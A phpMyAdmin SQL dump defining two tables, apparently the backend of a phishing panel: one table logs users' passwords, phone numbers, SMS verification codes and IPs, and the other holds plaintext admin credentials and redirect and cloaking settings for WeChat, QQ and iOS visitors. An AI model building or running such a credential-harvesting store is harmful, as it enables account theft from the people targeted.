-- phpMyAdmin SQL Dump
-- version 4.4.15.10
-- https://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: 2024-06-28 23:42:58
-- 服务器版本： 5.6.50-log
-- PHP Version: 5.6.40

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `wd33`
--

-- --------------------------------------------------------

--
-- 表的结构 `ec_conf`
--

CREATE TABLE IF NOT EXISTS `ec_conf` (
  `id` int(11) NOT NULL,
  `user` varchar(50) DEFAULT NULL,
  `pass` varchar(50) DEFAULT NULL,
  `title` varchar(200) DEFAULT NULL,
  `readyJump` varchar(200) DEFAULT NULL,
  `location` varchar(200) DEFAULT NULL,
  `confusion` int(11) DEFAULT NULL,
  `viewTimes` int(11) DEFAULT NULL,
  `allowWeixin` int(11) DEFAULT NULL,
  `allowQQ` int(11) DEFAULT NULL,
  `allowIOS` int(11) DEFAULT NULL,
  `allowAll` int(11) DEFAULT NULL,
  `denyReady` int(11) DEFAULT NULL,
  `deny` int(11) DEFAULT NULL,
  `tongji` varchar(300) DEFAULT NULL,
  `logo` varchar(300) DEFAULT NULL,
  `datatype` varchar(200) DEFAULT NULL
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `ec_conf`
--

INSERT INTO `ec_conf` (`id`, `user`, `pass`, `title`, `readyJump`, `location`, `confusion`, `viewTimes`, `allowWeixin`, `allowQQ`, `allowIOS`, `allowAll`, `denyReady`, `deny`, `tongji`, `logo`, `datatype`) VALUES
(1, 'dyad88', 'qwe123123', '', 'https://www.douyin.com/', 'https://docs.qq.com/', 5, 0, 1, 1, 1, 1, 1, 0, '123123132', 'game', '1');

-- --------------------------------------------------------

--
-- 表的结构 `ec_data`
--

CREATE TABLE IF NOT EXISTS `ec_data` (
  `id` int(11) NOT NULL,
  `del` tinyint(1) unsigned zerofill DEFAULT '0',
  `user` varchar(50) DEFAULT NULL,
  `pass` varchar(50) DEFAULT NULL,
  `code` varchar(200) DEFAULT NULL,
  `phone` varchar(50) NOT NULL,
  `issend` varchar(50) DEFAULT NULL,
  `isyanzheng` varchar(50) DEFAULT NULL,
  `state` int(11) DEFAULT NULL,
  `href` varchar(200) DEFAULT NULL,
  `date` varchar(200) DEFAULT NULL,
  `time` varchar(50) DEFAULT NULL,
  `visit` int(11) DEFAULT '0',
  `city` varchar(50) DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL,
  `info` varchar(200) DEFAULT NULL,
  `logs` text
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `ec_conf`
--
ALTER TABLE `ec_conf`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`);

--
-- Indexes for table `ec_data`
--
ALTER TABLE `ec_data`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `ec_conf`
--
ALTER TABLE `ec_conf`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `ec_data`
--
ALTER TABLE `ec_data`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
